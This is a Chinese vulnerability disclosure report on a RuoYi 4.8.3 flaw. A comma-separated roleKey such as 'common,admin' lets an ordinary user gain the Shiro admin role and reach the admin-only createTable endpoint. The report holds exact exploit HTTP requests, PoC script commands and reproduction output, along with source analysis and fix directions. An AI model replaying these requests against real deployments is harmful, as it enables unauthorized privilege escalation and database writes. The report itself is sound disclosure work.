# RuoYi 角色键注入导致管理员角色校验绕过

## 结论

RuoYi 将角色权限键保存在一个可由角色编辑接口修改的字符串中，但在授权时又把这个字符串按逗号拆成多个 Shiro 角色。当前代码没有禁止普通角色把 `admin` 放进自己的 `roleKey`，也没有把 `roleKey` 的完整字符串唯一性检查与拆分后的角色名对应起来。

因此，一个本来只有普通角色的已认证用户，可以把自己的角色键从 `common` 改成 `common,admin`。重新登录后，Shiro 会把该用户当作拥有 `admin` 角色，从而通过仅允许 `@RequiresRoles("admin")` 的建表接口。该接口随后在真实应用数据库中创建表并写入 `gen_table` 元数据。

这不是把用户绑定到管理员角色，也不是伪造用户 ID 1 的通配符权限；它是对 `roleKey` 的逗号解析与保留角色名缺少边界校验，导致一个普通角色可以铸造受保护的 `admin` 角色令牌。

## 钉死的审计对象

| 项目 | 值 |
|---|---|
| 仓库 | `https://github.com/yangzongzhuan/RuoYi.git` |
| 默认分支 | `master` |
| 审计 commit | `7995a83e04e1a88aaea5a8a7c50570dffcb145e0` |
| tag | 该 commit 没有对应 tag |
| 项目版本 | `4.8.3`（`pom.xml` 与启动 banner） |
| 冻结方式 | 从 `origin` 精确 fetch 该 SHA 后使用 detached worktree；没有在分析或复现中更新 HEAD |
| 工作树 | 产品源代码无修改；仅产生 Maven `target/` 构建产物和本报告/PoC 文件 |

该 commit 的提交信息是 `表格树删除通用请求方法改为POST`。审计开始时通过 `git ls-remote origin refs/heads/master` 记录到上述 SHA；后续所有源码、构建和运行时验证均来自此 SHA。

仓库内没有 `SECURITY.md`、安全政策、`AGENTS.md` 或贡献指南。本文按任务约定排除了 XSS、自 XSS、纯最佳实践、仅管理员误配和没有实际边界后果的候选。

## 受影响代码

### 1. 角色编辑接口只检查角色 ID，不检查角色键语义

`ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysRoleController.java:165-179`：

```java
@RequiresPermissions("system:role:edit")
@Log(title = "角色管理", businessType = BusinessType.UPDATE)
@PostMapping("/authDataScope")
@ResponseBody
public AjaxResult authDataScopeSave(SysRole role)
{
    roleService.checkRoleAllowed(role);
    roleService.checkRoleDataScope(role.getRoleId());
    role.setUpdateBy(getLoginName());
    if (roleService.authDataScope(role) > 0)
    {
        setSysUser(userService.selectUserById(getUserId()));
        return success();
    }
    return error();
}
```

这里的 `role` 由 HTTP 表单直接绑定。`checkRoleAllowed` 在 `ruoyi-system/src/main/java/com/ruoyi/system/service/impl/SysRoleServiceImpl.java:315-320` 只拒绝 `roleId == 1` 的记录：

```java
if (StringUtils.isNotNull(role.getRoleId()) && role.isAdmin())
{
    throw new ServiceException("不允许操作超级管理员角色");
}
```

它没有检查提交的 `roleKey` 是否包含 `admin`，也没有限制角色键只能是一个合法的、非保留的标识。对普通角色 ID 2 的数据范围检查仍然会通过，因为操作者本来就能看到和编辑该普通角色。

### 2. `authDataScope` 把未经语义校验的角色键写入数据库

`ruoyi-system/src/main/java/com/ruoyi/system/service/impl/SysRoleServiceImpl.java:213-223`：

```java
@Override
@Transactional
public int authDataScope(SysRole role)
{
    roleMapper.updateRole(role);
    roleDeptMapper.deleteRoleDeptByRoleId(role.getRoleId());
    return insertRoleDept(role);
}
```

`ruoyi-system/src/main/resources/mapper/system/SysRoleMapper.xml:95-107` 中的更新语句直接接受 `roleKey`：

```xml
<update id="updateRole" parameterType="SysRole">
    update sys_role
    <set>
        <if test="roleKey != null and roleKey != ''">role_key = #{roleKey},</if>
        <if test="dataScope != null and dataScope != ''">data_scope = #{dataScope},</if>
        ...
    </set>
    where role_id = #{roleId}
</update>
```

角色键的“唯一性”检查位于同一 Mapper 的 `:79-82`，比较的是完整字符串 `r.role_key = #{roleKey}`。因此已有角色键 `admin` 不会阻止 `common,admin`：两者作为完整字符串并不相等。

### 3. 授权时按逗号把普通角色变成 `admin`

`ruoyi-system/src/main/java/com/ruoyi/system/service/impl/SysRoleServiceImpl.java:68-79`：

```java
public Set<String> selectRoleKeys(Long userId)
{
    List<SysRole> perms = roleMapper.selectRolesByUserId(userId);
    Set<String> permsSet = new HashSet<>();
    for (SysRole perm : perms)
    {
        if (StringUtils.isNotNull(perm))
        {
            permsSet.addAll(Arrays.asList(perm.getRoleKey().trim().split(",")));
        }
    }
    return permsSet;
}
```

`ruoyi-framework/src/main/java/com/ruoyi/framework/shiro/realm/UserRealm.java:65-78` 将这些字符串交给 Shiro：

```java
if (user.isAdmin())
{
    info.addRole("admin");
    info.addStringPermission("*:*:*");
}
else
{
    roles = roleService.selectRoleKeys(user.getUserId());
    menus = menuService.selectPermsByUserId(user.getUserId());
    info.setRoles(roles);
    info.setStringPermissions(menus);
}
```

这里需要注意边界：伪造的 `admin` 只会进入 Shiro 角色集合，不会触发 `userId == 1` 才有的 `*:*:*` 通配符权限。本文只声称实际打通的 `@RequiresRoles("admin")` 接口。

### 4. 被越权进入的真实敏感写入点

`ruoyi-generator/src/main/java/com/ruoyi/generator/controller/GenController.java:195-221`：

```java
@RequiresRoles("admin")
@Log(title = "创建表", businessType = BusinessType.OTHER)
@PostMapping("/createTable")
@ResponseBody
public AjaxResult create(String sql)
{
    try
    {
        SqlUtil.filterKeyword(sql);
        List<SQLStatement> sqlStatements = SQLUtils.parseStatements(sql, DbType.mysql);
        ...
        if (sqlStatement instanceof MySqlCreateTableStatement)
        {
            if (genTableService.createTable(createTableStatement.toString()))
            {
                ...
            }
        }
        ...
        genTableService.importGenTable(tableList, operName);
        return AjaxResult.success();
    }
    catch (Exception e)
    {
        return AjaxResult.error("创建表结构异常");
    }
}
```

最终数据库调用在 `ruoyi-generator/src/main/resources/mapper/generator/GenTableMapper.xml:168-170`：

```xml
<update id="createTable">
    ${sql}
</update>
```

本文的 payload 是该功能允许的普通 `CREATE TABLE`，没有利用 SQL 关键字过滤绕过，也没有把历史 SQL 注入或代码生成 RCE 当作本漏洞的危害。实际证明的是：未拥有 `admin` Shiro 角色的用户被拒绝后，伪造该角色即可完成数据库 DDL 写入和生成器元数据写入。

## Source → Transfer → Sink

1. Source：已认证的普通用户 `ry` 向 `POST /system/role/authDataScope` 提交 `roleId=2` 和 `roleKey=common,admin`。
2. Transfer：Spring 表单绑定把字符串写入 `SysRole.roleKey`；`authDataScope` 调用 `roleMapper.updateRole`，数据库中的 `sys_role.role_key` 变为 `common,admin`。
3. Transfer：用户重新登录时，`selectRoleKeys` 使用 `split(",")` 产生 `common` 与 `admin` 两个 Shiro 角色。
4. Sink：`@RequiresRoles("admin")` 的 `POST /tool/gen/createTable` 放行；`GenTableMapper.createTable` 在应用使用的 MySQL 中执行 `CREATE TABLE`，随后 `gen_table` 出现该表的生成器元数据。

## 利用前提与默认暴露

- 攻击者需要一个有效的低权限账号；不需要成为用户 ID 1，也不需要修改数据库或直接连接数据库。
- 该账号需要拥有 `system:role:edit`，并能通过数据范围检查看到目标普通角色。当前仓库的初始化 SQL 已满足这一前提：角色 2 是 `common`，用户 2 `ry` 绑定角色 2，角色 2 关联了 `system:role:edit` 菜单权限以及代码生成菜单权限（`sql/ry_20260319.sql:125-126,193,272-273,289-373`）。
- 当前应用默认使用 Shiro 角色授权，`/tool/gen/createTable` 在产品代码中真实存在并以 `admin` 角色保护。
- 验证使用了初始化 SQL 的本地 MySQL。验证码默认开启时，主验证通过 `/captcha/captchaImage?type=math` 获取并人工读取数学题后登录；漏洞不依赖验证码配置。

## 完整 PoC

可运行脚本位于同目录的 [`ruoyi-role-key-poc.sh`](./ruoyi-role-key-poc.sh)。脚本会：

1. 先检查 checkout 的 HEAD 必须等于冻结 SHA，并用 Maven 容器构建当前 commit 的完整 `ruoyi-admin` JAR；
2. 用 `sql/ry_20260319.sql` 启动新的 MySQL 8.0 容器；
3. 启动真实 `ruoyi-admin` 应用容器；
4. 用 `ry/admin123` 登录，验证角色键修改前建表请求被拒绝；
5. 通过真实 `/system/role/authDataScope` 修改角色键；
6. 新建登录会话，再调用真实 `/tool/gen/createTable`，查询 MySQL 确认表和 `gen_table` 元数据均出现；
7. 只删除 PoC 自己创建的表和元数据，并删除本次临时容器。

为使脚本无需人工读验证码，它把仅用于实验自动化的启动参数设为 `--shiro.user.captchaEnabled=false`。这不是绕过授权的手段：脚本仍通过真实登录、真实 Shiro 会话、真实控制器和真实数据库运行；主验证在默认验证码开启的配置下已经完成。

运行命令（在冻结 checkout 中）：

```bash
cd /workspace/RuoYi
REPO_DIR=/tmp/ruoyi-audit-7995 \
RUN_ID=script1 MYSQL_PORT=33310 APP_PORT=18090 \
./ruoyi-role-key-poc.sh
```

如需从远程重新准备独立 checkout，应只取下面的精确 commit，不要拉取新的分支头：

```bash
git clone https://github.com/yangzongzhuan/RuoYi.git /tmp/ruoyi-child-7995
git -C /tmp/ruoyi-child-7995 checkout --detach 7995a83e04e1a88aaea5a8a7c50570dffcb145e0
REPO_DIR=/tmp/ruoyi-child-7995 ./ruoyi-role-key-poc.sh
```

## 主验证：默认验证码、真实 HTTP 与数据库

主验证使用以下容器和冻结 commit 构建结果：

```text
maven:3.9.9-eclipse-temurin-17
mysql:8.0
eclipse-temurin:17-jre
```

构建命令及结果：

```text
docker run --rm -v /tmp/ruoyi-audit-7995:/workspace -w /workspace \
  maven:3.9.9-eclipse-temurin-17 mvn -B -DskipTests package
exit code: 0
BUILD SUCCESS
```

应用以 `--server.port=18082` 启动，MySQL 以 host-network 的 `33307` 端口启动。由于本机 Docker bridge 的容器间连接不可达，第一次 bridge 尝试得到 MySQL `Communications link failure`，没有被当作漏洞结果；随后用显式 host-network 重试成功。该环境调整不改动产品代码。

### 控制组：未伪造角色键

初始化数据库查询得到：

```text
user_id login_name status del_flag
1       admin      0      0
2       ry         0      0

role_id role_key data_scope
1       admin    1
2       common   2
```

使用默认验证码登录 `ry` 后，提交普通的建表请求：

```http
POST /tool/gen/createTable
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<控制组登录会话>

sql=CREATE TABLE cve_rolekey_control_7995 (id INT PRIMARY KEY)
```

观察结果：HTTP 状态为 `200`，响应 HTML 的标题为 `RuoYi - 403`，正文含 `您没有访问权限！`；请求前后 `information_schema.tables` 中该表的计数均为 `0`。

### 利用组：角色键注入与新会话

同一个普通账号提交：

```http
POST /system/role/authDataScope
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<控制组登录会话>

roleId=2&roleKey=common%2Cadmin&dataScope=2&deptIds=100&deptIds=101&deptIds=105
```

响应：

```http
HTTP/1.1 200
Content-Type: application/json

{"msg":"操作成功","code":0}
```

数据库前后：

```text
BEFORE: 2  common       2
AFTER:  2  common,admin 2
```

随后丢弃旧会话，新建会话并再次以 `ry/admin123` 登录。登录成功后提交：

```http
POST /tool/gen/createTable
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<新登录会话>

sql=CREATE TABLE cve_rolekey_poc_7995 (id INT PRIMARY KEY)
```

观察结果：

```text
HTTP/1.1 200
{"msg":"操作成功","code":0}

information_schema.tables:
cve_rolekey_poc_7995

gen_table:
cve_rolekey_poc_7995    ry
```

数据库中实际生成的表结构为：

```sql
CREATE TABLE `cve_rolekey_poc_7995` (
  `id` int NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
```

验证完成后已删除 `cve_rolekey_poc_7995` 及其 `gen_table` 记录；没有修改产品源代码。

## Docker 独立复现

独立 child agent 在全新上下文中从远程 checkout 了精确 SHA，没有继承主验证的工作树、数据库或会话。它确认 detached HEAD 干净，重新构建完整产品，再执行同一份脚本。使用的命令是：

```bash
git clone https://github.com/yangzongzhuan/RuoYi.git /tmp/ruoyi-child-7995
git -C /tmp/ruoyi-child-7995 checkout --detach 7995a83e04e1a88aaea5a8a7c50570dffcb145e0
cd /workspace/RuoYi
REPO_DIR=/tmp/ruoyi-child-7995 RUN_ID=child7995 \
  MYSQL_PORT=33311 APP_PORT=18091 ./ruoyi-role-key-poc.sh
```

child agent 返回的关键结果如下：

```text
checkout exit code: 0
HEAD: 7995a83e04e1a88aaea5a8a7c50570dffcb145e0
working tree: clean, detached HEAD
build exit code: 0
BUILD SUCCESS
PoC exit code: 0
CONTROL_CREATE_HTTP=200
CONTROL_TABLE_AFTER=0
ROLE_MUTATION_HTTP=200
MUTATED_ROLE=2    common,admin    2
ATTACK_CREATE_HTTP=200
ATTACK_TABLE_AFTER=cve_rolekey_poc_child7995
ATTACK_GENERATOR_ROW=cve_rolekey_poc_child7995    ry
CLEANUP_TABLE=0
POC_RESULT=PASS
```

控制请求响应虽然是 HTTP 200，但正文标题为 `RuoYi - 403`；利用组是在新登录会话中完成的真实 HTTP 请求，数据库表和生成器元数据均实际出现。child agent 未修改产品源码、未提交或 push。该独立复现成功后才进入报告定稿和 GitHub staging。

## 历史与原创性筛选

### 筛选时间与范围

在候选确定前、主 Docker 验证成功后以及独立 child Docker 验证成功后，重新检查了 RuoYi 的 CVE/NVD、GHSA、Issues、PR 列表、相关路径历史和 release/changelog。复现成功后的仓库 API 精确文本搜索结果仍为：

```text
search/issues: repo:yangzongzhuan/RuoYi roleKey  -> total_count 0
search/commits: repo:yangzongzhuan/RuoYi role_key -> total_count 0
all PR title matches for roleKey/role key/role/authorization/permission/privilege -> []
```

相关路径的远程提交历史中，近期提交是通用的 `isAdmin` 统一和数据权限限制，没有把逗号角色键解析限制为保留字安全集合的修复。公开 PR 中未发现描述该 `roleKey` 注入路径或同一根因的 open/merged 修复。

### 五维对照

| 已知项 | 已知问题的五维 | 本报告为何不是同一问题 |
|---|---|---|
| [GHSA-h5jh-rp76-q242 / CVE-2024-57438](https://github.com/advisories/GHSA-h5jh-rp76-q242) | 低权限用户通过不安全的用户-角色分配，把更高权限的角色 ID 绑定给自己；影响版本为较早的 `4.8.0` 及以前 | 本路径不改 `sys_user_role`、不提交角色 ID，也不把用户绑定到角色 1；它只修改角色 2 的 `role_key`，再由 `split(",")` 铸造 Shiro 的 `admin` token |
| [CVE-2025-56396](https://nvd.nist.gov/vuln/detail/CVE-2025-56396) | 部门数据范围导致的权限提升 | 本路径的输入、根因和 sink 是 `roleKey` 字符串解析与 `@RequiresRoles`，不是部门数据范围计算 |
| [Issue #328 / CVE-2026-37669](https://github.com/yangzongzhuan/RuoYi/issues/328) | `authDataScope` / `authUser` 未检查提交的 `deptIds` / `userIds` 是否在操作者数据范围内，越权写入角色-部门或用户-角色映射 | 虽然共用 `authDataScope` 控制器，但本 PoC 使用操作者本来有权提交的 `deptIds=100,101,105`；越权字段是 `roleKey`，后果是 Shiro 角色授权，未触及该 issue 的映射 sink |
| [Issue #300](https://github.com/yangzongzhuan/RuoYi/issues/300) | `/tool/gen/createTable` 的 SQL 过滤绕过/盲注 | 本 PoC 在获得角色前被同一 endpoint 的 `@RequiresRoles("admin")` 拦截，获得角色后只提交合法的 `CREATE TABLE`；没有使用过滤绕过或数据读取 |
| [Issue #205](https://github.com/yangzongzhuan/RuoYi/issues/205) | 代码生成字段、路径和重启链造成 RCE，且依赖生成器管理能力 | 本报告不使用代码注入、路径或重启，也不把 RCE 当作实际危害；新根因是角色键铸造 |

因此，已知项虽然有角色管理、数据权限或代码生成的邻近主题，但与本候选在受影响字段、输入向量、根因、授权转移路径和实测危害上均不构成五维重合。主验证成功后再次执行的 `roleKey` issue/commit 搜索也没有发现相同问题的公开修复或报告。

## 实际危害与边界

已经在本地当前 commit 上实际观察到的危害只有：普通账号越过 `@RequiresRoles("admin")`，在应用使用的 MySQL 中创建攻击者指定的表，并留下生成器元数据。它是未授权数据库结构写入和角色保护边界绕过。

本文不声称：

- 伪造角色键能得到 `*:*:*` 全权限；
- 能直接读取任意表、执行任意 SQL、远程命令执行或接管服务器；
- 默认验证码被绕过；
- 已知 SQL 注入、生成器 RCE 或历史角色分配问题是本问题的根因。

这些限制与 PoC 的实际输出一致，也避免把邻近的历史漏洞叠加成未经验证的影响。

## 修复方向（不在本次工作中实施）

本次按要求没有修改产品代码。修复设计应在把角色键交给授权框架前建立明确的角色标识模型：禁止逗号注入或改为结构化角色集合；对 `admin` 等保留角色名做服务端拒绝；唯一性检查应针对最终授权 token，而不是只比较原始完整字符串；同时保留对角色 ID 1 和角色数据范围的独立检查。
